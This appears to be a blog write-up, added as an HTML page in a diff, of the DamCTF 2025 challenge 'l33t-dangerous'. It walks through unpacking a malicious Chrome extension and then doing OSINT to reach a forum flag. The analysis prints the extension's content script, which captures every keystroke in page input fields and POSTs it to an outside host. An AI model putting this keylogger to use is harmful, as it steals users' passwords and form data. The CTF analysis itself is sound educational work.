@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>l33t-dangerous &ndash; alanoo.dev</title>
+    <meta name="description" content="My dev page :)">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="/css/colour/gruvbox-dark.css">
+    <link rel="stylesheet" href="/css/colour/dark-mode.css">
+    <link rel="stylesheet" href="/css/risotto.css">
+    <link rel="stylesheet" href="/css/custom.css">
+</head>
+
+<body>
+    <div class="page">
+        <header class="page__header">
+            <h1 class="page__logo"><a href="/" class="page__logo-inner">alanoo.dev</a></h1>
+            <nav class="page__nav main-nav">
+                <ul>
+    
+    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/achievements/" title="Posts">Achievements</a></li>
+                    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="Writeups">Writeups</a></li>
+                
+                    <li class="main-nav__item"><a class="nav-main-item" href="/posts/" title="Projects">wip</a></li>
+                    
+                    </ul>
+            </nav>
+        </header>
+
+        <section class="page__body">
+            <header class="content__header">
+                <h1>l33t-dangerous <code><span style="color:#cfa63f">misc</code></pre></h1>
+            </header>
+            <div class="content__body">
+                <h2 id="kategori">Category</h2>
+                <p>Misc</p>
+                <h2 id="author">Chall Authors</h2>
+                <p>WholeWheatBagels & Alex</p>
+                <h2 id="stats">Stats</h2>
+                <p>Total Solves: <strong>48/781 Teams</strong></p>
+                <p>Final Points: <strong>475p</strong></p>
+                <h2 id="description">Description</h2>
+                <p>I was digging through my dad’s old CDs and found this. He used to work IT for the school district. Apparently, a middle schooler installed it on a teacher’s PC and somehow got into the grading system with it. No idea how it worked, but maybe you can figure it out.</p>
+                <h2 id="prewords">Preface</h2>
+                <p>When the CTF started I was stunned that there was only 1 web challenge and that you had to first solve a misc challenge to even be able to attempt the web challenge.<p>
+                <p>Well I regret ever being dissapointed because these 2 challenges were extremely fun and the amount of effort put into them is insane. This is part 1/2.</p>
+                <h2 id="chromecrx">Chrome Extension</h2>
+                <p>We are provided a file called <code>boom.crx</code> which is a chrome extension.</p>
+                <p>Renaming it <code>boom.zip</code> and then unzipping it we find two files. manifest.json & content-script.js:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/boom.png"></p>
+                <p>Manifest didn't contain anything special, that can't be said for the script.js file:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/scriptjs.png"></p>
+                <p>It seems to be trying to hide the malicious payload by embeding a wav file. But if we scroll down we find the actual payload:</p>
+                <div class="highlight">
+                    <pre style="font-size: 14px;"><code class="language-javascript">
+                        window.fetch = async (...args) => {
+    // this stupid extension is useless why wont it work anymore?????
+    // TODO: find out who invented CORS
+
+    // whatever let's just simulate it for now
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    return {
+        ok: false,
+        status: 418,
+        statusText: "I'm a teapot",
+        json: async () => ({ success: true }),
+        text: async () => "it worked great",
+    };
+};
+
+const targetNode = document.documentElement
+
+const config = {attributes: true, childList: true, subtree: true};
+
+const callback = (mutationList, observer) => {
+    for (const mutation of mutationList) {
+        if (mutation.type === "childList" && mutation.addedNodes.length > 0) {
+            mutation.addedNodes.forEach(node => {
+                if (node.nodeName === "INPUT") {
+                    node.addEventListener("input", (e) => {
+                        boom.currentTime = 0;
+                        boom.play();
+
+                        fetch("https://mwaas.el1t3.fun/payload", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify({
+                                value: e.target.value,
+                                url: window.location.href,
+                                ele: e.target.name,
+                                user: "NAVI"
+                            }),
+                        });
+                    });
+                }
+            });
+        }
+    }
+};
+
+// Create an observer instance linked to the callback function
+const observer = new MutationObserver(callback);
+
+// Start observing the target node for configured mutations
+observer.observe(targetNode, config);
+                    </code></pre>
+                </div>
+                <p>Okay I'm going to be honest, i spent too much time on the wav file trying to find details using stenography... Not my brightest moment.</p>
+                <p>Anyway this seems to be a malicious chrome extension without the actual payload as the comments state.</p>
+                <p>The important bit is the website: <code>https://mwaas.el1t3.fun/payload</code> which when posted to shows:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/cahce.png"></p>
+                <p>Removing /payload I found the C2 site's UI which looked pretty nice actually:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/c2.png"></p>
+                <p>I checked the html and js of the site but found nothing interesting so off to /login we go:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/c2login.png"></p>
+                <p>Now this is something I checked as soon as I saw SAML, the versions of all technologies on the site but it didn't help as everything was up to date.</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/wapp.png"></p>
+                <p>Seeing as I wasn't able to do anything here I clicked register and thats where the <strong>real</strong> challenge started.</p>
+                <h2 id="elitezone">WELCOME TO THE EL1T3 ZON3 FORUMS</h2>
+                <p>This is a "CSGO modding forum" with a few members active. Looking at wappanalyzer again I found it was using phpBB and a custom cool theme.</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/ELITEZONE.png"></p>
+                <p>Clicking I Agree I was then prompted to register, well thats a problem... Why? Well theres an impossible captcha:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/captcha.png"></p>
+                <p>I tried everything, SQL injection, dirbuster, looking at old CVEs and nothing helped me get through this captcha. After a while i just started clicking everything and found I could login as a guest.</p>
+                <p>Just going to index.php gave me access to 2 boards, Offtopic and CS 1.6 Server. Can you guess which name I saw?</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/boards.png"></p>
+                <p>Looking through the posts I found these members:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/members.png"></p>
+                <p>2 Posts were of interest to me, these ones:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/post1.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/post2.png"></p>
+                <p>I would just like to say, HOLY SHIT I LOVED THAT VIDEO. It feels so nostalgic and so of it's age (2008 ish). Thank you chall author for making it, also i found this :></p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/mistake.png"></p>
+                <p>2025 omg.</p>
+                <p>Anyway in the first mentioned post by CacheTheStamp3de we find a IP adress to what seems to be his maps: <code>http://44.237.105.82/cstrike</code></p>
+                <p>Going here we find these folders:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/maps.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/banner.png"></p>
+                <p>In the folders I found CSGO maps in .txt and .bsp formats. Going to the root directory I found the banenr with a teamspeak server, Nice!</p>
+                <p>One thing I spent too much time on was to use a tool like BSP Viewer to perhaps find secrets in the maps which after 4 hours didn't seem like it was the case :(.</p>
+                <h2 id="osint">Osint Mission</h2>
+                <p>Remember the video? Yeah in it we see NAVI playing CSGO using Steam.</p>
+                <p>Idea! What if we try looking up all the people in the forums on steam? Well doing this I found 2 profiles. CacheTheStamp3de which was private, and konata which wasn't private...</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/konata.png"></p>
+                <p>BINGO! What I found was that she/he is part of a group called "Skid Force Zero" lmao.</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/steam.png"></p>
+                <p>Finally I found the teamspeak password: <code>doorstuck22</code>.</p>
+                <p>During the CTF I was doing the OSINT while on a walk so I didn't have access to teamspeak. Well that until I saw it on the app store for 1 Dollar...</p>
+                <p>Ignoring my good financial descisions I connected to the teamspeak server and found this:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/teamspeak.png"></p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/desc.png"></p>
+                <p>Now we can go back to the captcha and register an account and logging in I unlocked a new board:</p>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/hacking.png"></p>
+                <p>Looking at the second post I found this:</p>
+                <h2 id="flag">Flag</h2>
+                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/flag.png"></p>
+                <code><span style="color:#c3b8de">dam{we_wer3_the_skids_all_al0ng}</span></code>
+                <h2 id="afterwords">Afterwords</h2>
+                <p>This was a very nice chall. I appriciate the effort the authors put into it. The immersion was insane!</p>
+                <p>But wait, theres a part 2?</p>
+                <p><strong>Now that you've figured out who was behind this operation, can you figure out who else was affected?</strong></p>
+            <ul>
+                <li><a href="/writeups/damctf-2025/l33t-benign/">Part 2</a> <code><span style="color:#2ed8e8">web</code></li>
+            </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            </div>
+            <footer class="content__footer"></footer>
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+                <div class="aside__about">
+                    <h1 class="about__title">alanoo.dev</h1>
+                    <p class="about__description">My dev page :).</p>
+                </div>
+                <ul class="aside__social-links">
+                    <li>
+                        <a href="https://admin.tryhackme.com" rel="me" aria-label="secret" title="secret"><i class="fas fa-flag" aria-hidden="true"></i></a>&nbsp;
+                    </li>
+                </ul>
+                
+            </div>
+            <hr>
+            <div class="aside__content">
+                <p>
+                    By alanoo, 
+                    2025-05-11
+                </p>
+                <hr>
+                <span style="color:#ca7c9f">Table of Contents:</span>
+                <nav id="TableOfContents">
+
+                    <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">1.</span> <a href="#description">Description</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">2.</span> <a href="#prewords">Preface</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">3.</span> <a href="#chromecrx">Chrome Extension</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">4.</span> <a href="#elitezone">WELCOME TO THE EL1T3 ZON3 FORUMS</a>
+                      </div>
+                    <div><span style="color:#4d5859">5.</span> <a href="#osint">Osint Mission</a></div>
+                    <div><span style="color:#4d5859">6.</span> <a href="#flag">Flag</a></div>
+                    <div><span style="color:#4d5859">7.</span> <a href="#afterwords">Afterwords</a></div>
+
+        </nav>
+
+        
+                        </div>
+                        <p></p>
+                        <div class="logo-container" style="display: flex; justify-content: center; align-items: center;">
+                            <img class="w-100 mx-auto d-block cyber-glitch-0" 
+                                style="max-width: 300px; padding: 25px; padding-top: 0;" 
+                                src="/writeups/damctf-2025/assets/image.png">
+                        </div>
+                    </section>
+        
+                    <footer class="page__footer"><p>
+        
+            <p class="copyright"></p>
+            <p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+        </footer>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+
+</body>
+
+</html>
